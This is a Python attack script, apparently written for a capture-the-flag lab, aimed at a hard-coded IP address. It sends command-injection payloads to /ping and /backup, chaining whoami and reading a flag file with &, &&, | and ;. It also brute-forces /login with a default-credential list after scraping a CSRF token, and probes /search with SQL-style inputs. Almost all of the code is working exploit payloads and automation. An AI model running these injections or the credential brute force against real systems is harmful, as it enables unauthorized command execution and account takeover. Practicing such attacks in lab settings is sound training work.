import requests
import re
import os

# 确保没有全局代理环境变量
os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
os.environ.pop('http_proxy', None)
os.environ.pop('https_proxy', None)

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

# 新建一个干净的session
session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
# 显式禁用代理
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_ping():
    """测试Ping命令执行"""
    print_section("1. 测试Ping命令执行")
    
    ping_url = f"{TARGET}/ping"
    
    ping_payloads = [
        "127.0.0.1",
        "127.0.0.1 & whoami",
        "127.0.0.1 & type F:\\flag.txt",
        "127.0.0.1 && whoami",
        "127.0.0.1 && type F:\\flag.txt",
        "127.0.0.1 | whoami",
        "127.0.0.1 | type F:\\flag.txt",
        "127.0.0.1; whoami",
        "127.0.0.1; type F:\\flag.txt",
        "& whoami",
        "& type F:\\flag.txt",
        "&& whoami",
        "&& type F:\\flag.txt",
        "| whoami",
        "| type F:\\flag.txt",
        ";whoami",
        ";type F:\\flag.txt",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 50:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_backup():
    """测试Backup命令执行"""
    print_section("2. 测试Backup命令执行")
    
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        "F:\\small peoject\\python-lab\\uploads",
        "F:\\small peoject\\python-lab\\uploads & whoami",
        "F:\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads && whoami",
        "F:\\small peoject\\python-lab\\uploads && type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads | whoami",
        "F:\\small peoject\\python-lab\\uploads | type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads; whoami",
        "F:\\small peoject\\python-lab\\uploads; type F:\\flag.txt",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_login():
    """测试登录"""
    print_section("3. 测试登录")
    
    url = f"{TARGET}/login"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "ctf"),
        ("admin", "term3lab"),
        ("admin", "flag"),
        ("admin", "python"),
        ("admin", "lab"),
        ("admin", "term3"),
        ("root", "root"),
        ("root", "password"),
        ("root", "123456"),
    ]
    
    for username, password in credentials:
        try:
            data = {"username": username, "password": password, "csrf": csrf_token}
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "用户名或密码错误" not in r.text:
                    print(f"\n  🎉 登录成功: {username}/{password}")
                    print(f"     内容: {r.text[:800]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG FOUND: {flag_match.group(0)}")
                        return
                    return
                    
        except Exception as e:
            print(f"  错误: {e}")
    
    print("\n  ❌ 未找到有效凭据")


def test_search():
    """测试搜索功能"""
    print_section("4. 测试搜索功能")
    
    url = f"{TARGET}/search"
    
    search_payloads = [
        "flag",
        "FLAG",
        "secret",
        "admin",
        "password",
        "database",
        "config",
        "sql",
        "union",
        "select",
        "from",
        "where",
        "or",
        "and",
        "1=1",
        "'",
        "\"",
        "%",
        "*",
        "?",
    ]
    
    for payload in search_payloads:
        try:
            r = session.get(url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<div class="results">(.*?)</div>', r.text, re.DOTALL)
                if body_match:
                    results_content = body_match.group(1)
                    
                    if len(results_content) > 50:
                        print(f"\n  [{r.status_code}] ?q={payload}")
                        print(f"     结果: {results_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', results_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_ping()
    test_backup()
    test_login()
    test_search()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()